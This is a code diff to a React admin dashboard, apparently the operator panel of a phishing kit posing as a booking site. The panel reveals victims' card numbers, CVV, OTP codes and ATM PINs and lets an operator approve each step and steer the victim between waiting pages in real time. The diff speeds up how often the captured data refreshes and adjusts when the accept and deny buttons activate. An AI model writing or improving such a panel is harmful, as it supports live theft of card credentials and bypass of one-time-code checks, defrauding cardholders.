@@ -79,20 +79,29 @@ function BookingModal({
   onPaymentAction,
   onNavigate,
   clientCurrentPage,
+  refreshTrigger,
 }: {
   booking: Booking;
   onClose: () => void;
   onPaymentAction: (reference: string, action: "verified" | "denied") => void;
   onNavigate: (booking: Booking, page: string) => void;
   clientCurrentPage?: string;
+  refreshTrigger?: number;
 }) {
   const [showCardNum, setShowCardNum] = useState(false);
   const [showCvv, setShowCvv] = useState(false);
 
-  const { data: detailsData, isLoading } = trpc.admin.getTemplateForms.useQuery(
+  const { data: detailsData, isLoading, refetch: refetchDetails } = trpc.admin.getTemplateForms.useQuery(
     { Reference: booking.referenceId },
-    { refetchInterval: 3000 }
+    { refetchInterval: 1500 }
   );
+
+  // إعادة جلب البيانات فوراً عند وجود trigger جديد (newPayment)
+  useEffect(() => {
+    if (refreshTrigger && refreshTrigger > 0) {
+      refetchDetails();
+    }
+  }, [refreshTrigger]);
 
   const payment: Payment = (detailsData?.data?.payment as Payment) || {};
   const b = detailsData?.data?.booking || booking;
@@ -152,18 +161,18 @@ function BookingModal({
   }
 
   // هل فيه بيانات جديدة تحتاج قرار؟
-  // تضيء الأزرار عندما:
-  // 1. فيه بيانات بطاقة ولم يتخذ قرار بعد
-  // 2. أو العميل في صفحة الانتظار (bCall) - بعد إدخال البطاقة
-  // 3. أو فيه OTP جديد
-  // 4. أو فيه ATM PIN جديد
+  // الأزرار تضيء عندما paymentAction = "STILL" أو لم يُحدَّد بعد
+  // وتُطفأ عندما paymentAction = "accepted" أو "denied" أو "pass" أو "verified"
   const isInWaiting = currentPage === "bCall" || currentPage === "waiting";
-  const hasNewData = (
-    (hasCardData && (!payment.paymentAction || payment.paymentAction === "STILL")) ||
-    isInWaiting ||
-    hasOtp ||
-    hasAtm
+  const actionIsDone = (
+    payment.paymentAction === "accepted" ||
+    payment.paymentAction === "pass" ||
+    payment.paymentAction === "denied" ||
+    payment.paymentAction === "verified"
   );
+  const hasNewData = (
+    hasCardData && !actionIsDone
+  ) || isInWaiting;
 
   // أزرار القبول والرفض - تتفعل فقط لما فيه بيانات
   const acceptBtnStyle: React.CSSProperties = {
@@ -558,6 +567,8 @@ export default function AdminDashboard() {
   const socketRef = useRef<ReturnType<typeof socketIO> | null>(null);
   // تتبع مواقع العملاء في الوقت الفعلي: reference → page
   const [clientLocations, setClientLocations] = useState<Record<string, string>>({});
+  // trigger لإعادة جلب بيانات الـ Modal فوراً عند وجود newPayment
+  const [modalRefreshTrigger, setModalRefreshTrigger] = useState(0);
 
   // Auth check
   useEffect(() => {
@@ -597,6 +608,8 @@ export default function AdminDashboard() {
       const label = data.type ? typeLabels[data.type] || "بيانات جديدة" : "دفع جديد";
       toast.info(`${label} - المرجع: ${data.reference}`);
       refetchBookings();
+      // إعادة جلب بيانات الـ Modal فوراً إذا كان مفتوحاً لنفس الـ reference
+      setModalRefreshTrigger(prev => prev + 1);
     });
 
     // استقبال تحديث موقع العميل في الوقت الفعلي
@@ -704,6 +717,7 @@ export default function AdminDashboard() {
           clientCurrentPage={clientLocations[selectedBooking.referenceId]}
           onPaymentAction={handlePaymentAction}
           onNavigate={handleNavigate}
+          refreshTrigger={modalRefreshTrigger}
         />
       )}
 
